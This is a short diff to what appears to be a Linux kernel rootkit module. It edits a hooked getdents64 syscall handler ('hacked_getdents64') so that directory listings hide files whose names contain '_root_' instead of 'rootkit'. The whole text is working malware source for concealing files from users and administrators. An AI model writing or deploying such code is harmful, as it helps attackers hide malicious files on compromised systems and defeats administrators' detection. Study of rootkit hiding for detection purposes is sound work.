@@ -97,11 +97,12 @@ asmlinkage long hacked_getdents64 (unsigned int fd,  struct linux_dirent64 __use
 	unsigned long off = 0;
 	struct linux_dirent64 __user *dir;	
 
+/* list directory  and hide files containing name _root_ */
 	for(off=0;off<ret;){
 
 		dir=(void*)dirent+off;
-		
-		if((strstr(dir->d_name, "rootkit")) != NULL){
+	/* hide files containing name _root_ */	
+		if((strstr(dir->d_name, "_root_")) != NULL){
 		printk(KERN_ALERT "hide %s",dir->d_name);
 		   ret-=dir->d_reclen;
 			if(dir->d_reclen+off<ret)
